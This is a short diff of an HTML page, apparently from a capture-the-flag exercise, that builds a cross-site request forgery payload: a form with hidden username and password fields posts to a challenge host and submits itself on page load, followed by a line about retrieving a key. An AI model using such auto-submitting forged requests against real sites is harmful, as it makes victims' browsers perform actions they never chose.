@@ -1,15 +1,16 @@
 <html>
 	<body>
-	  <form method=POST action=http://csrf2.adriaan.haxx.be>
-		    <input type=submit name=username value=minions>
-		    <input type=submit name=password value=minions>
+	<form method=POST action=http://csrf2.adriaan.haxx.be>
+		    <input type=hidden name=username value=minions>
+		    <input type=hidden name=password value=minions>
+		    <input type="submit" name="login" value="Login" /> 
 		    </form>
 		  <script>
-		  	document.forms[0].submit();
 		  	document.forms[0].submit();
 		  </script>
 	</body>
 </html>
+
 
 By using this script locally and forcing the attacker to visit the page we can open it later to 
 retrieve the key.
